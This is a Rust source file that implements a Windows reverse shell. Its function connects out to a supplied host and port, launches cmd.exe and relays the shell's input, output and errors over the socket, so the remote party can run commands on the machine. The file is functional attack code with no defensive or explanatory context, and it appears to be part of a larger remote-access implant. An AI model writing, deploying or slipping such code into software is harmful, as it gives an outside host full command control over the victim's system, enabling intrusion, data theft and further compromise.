use std::io::{Read, Write};
use std::io::Result;
use std::net::TcpStream;
use std::process::{Command, Stdio};
use std::thread;

pub(crate) fn shell(host: String, port: String) -> Result<()> {
    let mut sock_write = TcpStream::connect(format!("{}:{}", host, port))?;
    let mut sock_write_err = sock_write.try_clone()?;
    let mut sock_read = sock_write.try_clone()?;

    let mut child = Command::new("cmd.exe")
        .arg("/K") // Use /K to keep the shell open and change the code page
        .arg("chcp 65001") // Change code page to UTF-8
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()?;

    let mut stdin = child.stdin.take().expect("Failed to open stdin");
    let mut stdout = child.stdout.take().expect("Failed to open stdout");
    let mut stderr = child.stderr.take().expect("Failed to open stderr");

    thread::spawn(move || {
        if let Err(e) = copy(&mut stdout, &mut sock_write) {
            eprintln!("stdout closed: {:?}", e);
        }
    });

    thread::spawn(move || {
        if let Err(e) = copy(&mut stderr, &mut sock_write_err) {
            eprintln!("stderr closed: {:?}", e);
        }
    });

    thread::spawn(move || {
        if let Err(e) = copy(&mut sock_read, &mut stdin) {
            eprintln!("stdin closed: {:?}", e);
        }
    });

    child.wait()?;

    println!("Shell exited");

    Ok(())
}

fn copy<R: Read, W: Write>(reader: &mut R, writer: &mut W) -> std::io::Result<u64> {
    std::io::copy(reader, writer)
}
